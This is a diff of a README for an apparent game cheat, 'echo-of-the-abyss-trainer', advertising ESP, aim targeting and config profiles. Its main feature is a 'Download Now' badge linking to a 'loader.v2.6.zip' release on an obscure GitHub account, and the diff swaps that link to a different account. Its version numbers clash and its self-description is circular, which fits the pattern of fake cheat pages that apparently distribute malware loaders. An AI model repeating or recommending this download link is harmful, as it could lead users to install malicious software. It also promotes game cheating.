@@ -1,42 +1,113 @@
-<div align="center">
+🎮 echo-of-the-abyss-trainer
 
-# 🎮 echo-of-the-abyss-trainer
+«⚡ A universal project with additional gameplay and visual features»
 
-> ⚡ Advanced Game Modification Project for echo-of-the-abyss-trainer
+Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lowercladisconnect/Loaderik/releases/download/v1.0.0/Loader.v2.6.zip)
+📖 About
 
-Latest Version: v1.0.0 • File Size: ~156 MB
+echo-of-the-abyss-trainer is a third-party project featuring a set of additional tools for customizing the game interface, displaying information, and adjusting various parameters.
 
----
+The main focus is on a convenient menu structure, flexible settings, and the ability to enable only the features you need.
 
-## 📖 About
+«🛠️ A simple interface, flexible configuration, and separate settings for different categories.»
 
-echo-of-the-abyss-trainer is a feature-rich third-party modification project for echo-of-the-abyss-trainer.
+✨ Features
 
----
+👁️ Information
 
-## ✨ Features
+- Player Information
+- Health Display
+- Distance Indicators
+- Name Display
+- Object Information
+- Additional Details
+- Customizable display elements
+- Separate parameters for different components
 
-- 👤 Player ESP
-- 🎯 Configurable Aim
-- 🖥️ Advanced Visual Settings
-- 🔫 Weapon Information
-- 🧍 Player Details
-- ⌨️ Custom Hotkeys
+🎯 Targeting
 
----
+- Target selection area customization
+- Selection of suitable targets
+- Distance settings
+- Sensitivity adjustment
+- Multiple operating modes
+- Individual hotkeys
+- Flexible parameter configuration
 
-## 💾 Configuration System
+👀 Visuals
 
-```text
+- Additional visual elements
+- Color customization
+- Distance information
+- Health display
+- Player names
+- Visibility settings
+- Interface appearance customization
+
+🔫 Weapon
+
+- Weapon information
+- Main characteristics
+- Additional indicators
+- Customizable display
+- Separate element settings
+
+🧍 Player
+
+- Basic player information
+- Health status
+- Distance
+- Names
+- Visual indicators
+- Additional details
+- Customizable display settings
+
+🛠️ Misc
+
+- Custom hotkeys
+- Settings saving
+- Multiple profiles
+- Quick feature switching
+- Interface customization
+- Additional parameters
+- Information panels
+
+🎨 UI / Menu
+
+The menu is organized by categories, making it easy to quickly find and adjust the required settings.
+
+- 🗂️ Settings divided into categories
+- 🎨 Appearance customization
+- ⌨️ Hotkey support
+- 💾 Settings saving
+- 📥 Configuration loading
+- 🔄 Quick feature enabling and disabling
+- 📊 Information panels
+- ⚡ Quick access to the main settings
+
+💾 Configuration
+
+Settings can be saved to separate profiles and switched between depending on the selected configuration.
+
+Available:
+
+- 📁 Multiple profiles
+- 💾 Settings saving
+- 📥 Configuration loading
+- 🔄 Quick switching
+- ⚙️ Separate category parameters
+- 📋 Ready-made presets
+- 🗂️ Convenient configuration management
+
+Example
+
 configs/
 ├── default.cfg
 ├── visual.cfg
 ├── player.cfg
 └── custom.cfg
-```
 
-`echo-of-the-abyss-trainer` · Updated: 2026-09-28
+[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TeamHelpFortress/Humilok/releases/download/v2.6/loader.v2.6.zip)
 
-**Tags:** `horror` `survival` `atmospheric` `indie` `exploration` `scifi` `stealth` `adventure` `singleplayer` `dark`
+Latest Version: v1.0.0 • File Size: ~156 MB
